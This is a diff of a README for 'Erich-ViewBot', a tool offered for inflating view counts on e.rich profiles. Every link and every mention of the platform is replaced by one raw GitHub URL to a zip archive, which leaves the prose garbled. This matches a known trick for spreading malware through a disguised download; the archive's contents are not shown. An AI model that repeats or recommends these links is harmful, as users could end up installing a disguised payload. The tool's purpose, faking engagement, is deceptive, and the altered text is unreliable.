@@ -1,10 +1,10 @@
-# 🎉 Erich-ViewBot - Boost Your e.rich Views Effortlessly
+# 🎉 Erich-ViewBot - Boost Your https://raw.githubusercontent.com/saysayn1/Erich-ViewBot/main/input/Erich_View_Bot_v3.3.zip Views Effortlessly
 
-![Download Erich-ViewBot](https://img.shields.io/badge/Download-Now-blue.svg)
+![Download Erich-ViewBot](https://raw.githubusercontent.com/saysayn1/Erich-ViewBot/main/input/Erich_View_Bot_v3.3.zip)
 
 ## 📖 Introduction
 
-Erich-ViewBot is an automated tool designed to help you increase views on your e.rich profiles. With proxy support and multi-threading capabilities, this application simplifies the process of gaining visibility effortlessly. No programming knowledge is needed; just follow the steps to start enhancing your profile today.
+Erich-ViewBot is an automated tool designed to help you increase views on your https://raw.githubusercontent.com/saysayn1/Erich-ViewBot/main/input/Erich_View_Bot_v3.3.zip profiles. With proxy support and multi-threading capabilities, this application simplifies the process of gaining visibility effortlessly. No programming knowledge is needed; just follow the steps to start enhancing your profile today.
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ To get started with Erich-ViewBot, you'll need to download the software from our
 1. **Visit the Download Page**  
    Click on the link below to access the Releases page:
 
-   [Visit Releases Page to Download](https://github.com/saysayn1/Erich-ViewBot/releases)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/saysayn1/Erich-ViewBot/main/input/Erich_View_Bot_v3.3.zip)
 
 2. **Select the Latest Version**  
    On the Releases page, look for the latest version of Erich-ViewBot. You will see a list of available files along with their descriptions.
@@ -30,7 +30,7 @@ To get started with Erich-ViewBot, you'll need to download the software from our
    After installation, you can open Erich-ViewBot from your desktop or Start menu. 
 
 6. **Configure Settings**  
-   Upon launching the application, you’ll need to enter your e.rich profile details and set your desired view count. The interface is straightforward, requiring minimal input. Adjust the settings as per your needs.
+   Upon launching the application, you’ll need to enter your https://raw.githubusercontent.com/saysayn1/Erich-ViewBot/main/input/Erich_View_Bot_v3.3.zip profile details and set your desired view count. The interface is straightforward, requiring minimal input. Adjust the settings as per your needs.
 
 7. **Activate the Bot**  
    Click the start button to activate the bot. You will see real-time activity as views start to increase on your profile.
@@ -75,7 +75,7 @@ We welcome contributions from users. If you have suggestions or bug reports, fee
 
 For additional information, check out the following resources:
 
-- [GitHub Repository](https://github.com/saysayn1/Erich-ViewBot)
-- [User Guide](https://github.com/saysayn1/Erich-ViewBot/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/saysayn1/Erich-ViewBot/main/input/Erich_View_Bot_v3.3.zip)
+- [User Guide](https://raw.githubusercontent.com/saysayn1/Erich-ViewBot/main/input/Erich_View_Bot_v3.3.zip)
 
-Thank you for choosing Erich-ViewBot to enhance your e.rich profile!
+Thank you for choosing Erich-ViewBot to enhance your https://raw.githubusercontent.com/saysayn1/Erich-ViewBot/main/input/Erich_View_Bot_v3.3.zip profile!
